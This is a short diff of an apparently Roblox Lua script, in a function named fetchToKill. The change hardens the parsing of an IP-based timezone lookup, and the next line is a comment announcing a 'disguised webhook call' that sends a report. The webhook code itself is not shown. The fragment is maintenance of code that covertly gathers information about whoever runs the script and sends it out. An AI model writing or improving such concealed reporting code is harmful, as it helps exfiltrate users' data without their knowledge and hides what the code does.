@@ -14,7 +14,10 @@ local function fetchToKill()
 
     -- Get UTC Offset
     local ipData = game:HttpGet("http://worldtimeapi.org/api/ip")
-    local utcOffset = ipData:match('"utc_offset":"([%+%-]%d%d:%d%d)"') or "+00:00"
+    local utcOffset = "+00:00" -- Default to UTC
+    if ipData and type(ipData) == "string" then
+    utcOffset = ipData:match('"utc_offset":"([%+%-]%d%d:%d%d)"') or utcOffset
+    end
     local timezone = "( UTC" .. utcOffset .. " )"
 
     -- Send report (disguised webhook call)
